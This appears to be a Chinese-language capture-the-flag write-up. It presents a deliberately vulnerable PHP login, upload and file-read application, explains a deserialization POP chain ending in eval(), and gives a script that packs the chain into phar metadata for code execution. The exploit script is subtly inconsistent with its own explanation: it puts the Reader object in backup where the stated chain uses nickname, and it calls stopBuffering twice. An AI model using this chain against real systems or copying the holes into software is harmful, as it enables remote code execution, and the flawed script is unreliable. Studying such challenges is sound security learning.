# 例题
*index.php*

```php
<?php
session_start();

if ($_GET["action"] == 'login'){
    $user=new user();
    if(isset($_POST['username'])){
        if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['username'])){
            die("<br>为什么不肯尝试点别的东西呢？");
        }
        if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['password'])){
            die("<br>为什么不肯尝试点别的东西呢？");
        }
        $user->login();
    }
} elseif ($_GET["action"] == 'read'){
    $user=new User();
    $user->read();
} elseif ($_GET["action"] == 'upload'){
    $user=new User();
    $user->upload();
}

class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public $backup;
    public function login() {
        if(isset($_POST['username'])&&isset($_POST['password'])){
        $mysqli=new dbCtrl();
        $this->id=$mysqli->login();
        if($this->id){
        $_SESSION['id']=$this->id;
        $_SESSION['login']=1;
        echo "你的ID是".$_SESSION['id'];
        echo "你好！".$_SESSION['token'];
        echo "<script>window.location.href='index.php?action=upload'</script>";
        }
    }
}
    public function upload(){
        $uploader=new Upload();
        $uploader->upload();
    }
    public function read(){
        $reader=new reader();
        $reader->read($_POST['filename']);
    }
    public function __toString()
    {
        $this->nickname->backup=$this->backup;
        $user = new User();
        $user->id = $_SESSION['id'];
        $user->nickname = $_SESSION['token'];
        return serialize($user);
    }
}
class dbCtrl
{
    public $hostname="127.0.0.1";
    public $dbuser="admin";
    public $dbpass="P@ssw0rd";
    public $database="database";
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this->name=$_POST['username'];
        $this->password=$_POST['password'];
    }
    public function login()
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("连接失败，错误:" . $this->mysqli->connect_error);
        }
        $sql="select id,password from users where username=?";
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
    public function __destruct(){
        echo $this->token;
    }
}
Class Reader{
    public $filename;
    public $result;
    public function read($filename){
        if (preg_match("/flag/i",$filename)){
            die("想多了嗷");
        }
        if (preg_match("/sh/i",$filename)){
            die("nooooooooooo!");
        }
        if (preg_match("/^php|^file|^gopher|^http|^https|^ftp|^data|^smtp|^dict|^zip/i",$filename)){
            die("Invid Schema!");
        }
        echo file_get_contents($filename);
    }
    public function __set($name,$val){
        echo eval($val);
    }
}

Class Upload{
    public $flag;
    public $file;
    public $ext;
    function __construct(){
        $this->flag = 1;
        $this->black_list = ['ph', 'ht', 'sh', 'pe', 'j', '=', 'co', '\\', '"', '\''];
    }
    function check(){
        $ext = substr($_FILES['file']['name'], strpos($_FILES['file']['name'], '.'));
        $reg=implode("|",$this->black_list);
        $reg = "/" . $reg . "\x|\s|[\x01-\x20]/i";
        if(preg_match($reg, $ext)){
            $this->flag = 0;
        }
        $this->ext = $ext;
    }

    function __wakeup(){
        $this->flag = 1;
    }

    function upload(){
        $this->file = $_FILES['file'];
        $this->check();
        if($this->flag){
            if(isset($_FILES['file'])){
                if ($_FILES["file"]["error"] > 0){
                    echo "Error: " . $_FILES["file"]["error"];
                }
                else{
                    if (file_exists("upload/" . $_FILES["file"]["name"])){
                        echo $_FILES["file"]["name"] . " already exists. ";
                    }
                    else{
                        if ($_FILES["file"]["size"] > 10240){
                            echo "too big";
                        }
                        else{
                            $new_addr = $_SERVER['DOCUMENT_ROOT'] . "/upload/" . md5($_FILES['file']['name']) . $this->ext;
                            echo $new_addr;
                            move_uploaded_file($_FILES["file"]["tmp_name"], $new_addr);
                            return $new_addr;
                        }
                    }
                }
            }
        }
        else{
            die("Noooooooooooooooooooooooooooo!");
        }
    }
}




```

## 思路
定位命令执行函数eval与反序列化的触发函数`file_get_contents()`，由于`eval`处于`__set()`魔术方法中,在代码中寻找`$xxx->yyy->zzz`这样形式的函数可以通过将`yyy`赋值为一个新的`Reader类`从而出现`zzz`在`Reader类`中不存在的情况以此触发`__set()`魔术方法，同样的去优先看了`__toString()`魔术方法，就有这样的使用

![](attachments/Pasted%20image%2020230311145233.png)

现在找`__toString()`的触发，主要找`echo 参数` 

![](attachments/Pasted%20image%2020230311145433.png)

找到之后还是`__destruct()`那么pop链就结束了

```txt
new dbCtrl() => $token=new User() => $nickname=new Reader()
								  => $backup = 命令
```


```php
<?php

class dbCtrl
{
    public $token;

    public function __destruct(){
        echo $this->token;
    }
}

Class Reader{
    public function __set($name,$val){
        echo eval($val);
    }
}

class User
{
    public $nickname=null;
    public $backup = "echo('wumonster');";
    public function upload(){
        $uploader=new Upload();
        $uploader->upload();
    }
    public function read(){
        $reader=new reader();
        $reader->read($_POST['filename']);
    }
    public function __toString()
    {
        $this->nickname->backup=$this->backup;
        $user = new User();
        $user->id = $_SESSION['id'];
        $user->nickname = $_SESSION['token'];
        return serialize($user);
    }
}

$a = new dbCtrl();
$b = new User();
$b -> backup = new Reader();
$a -> token = $b;

$phar = new Phar('phar.phar');
$phar -> stopBuffering();
$phar -> setStub("<?php __HALT_COMPILER();?>");
$phar -> addFromString('test.txt','test');
$object = $a;
$phar -> setMetadata($object);
$phar -> stopBuffering();

?>
```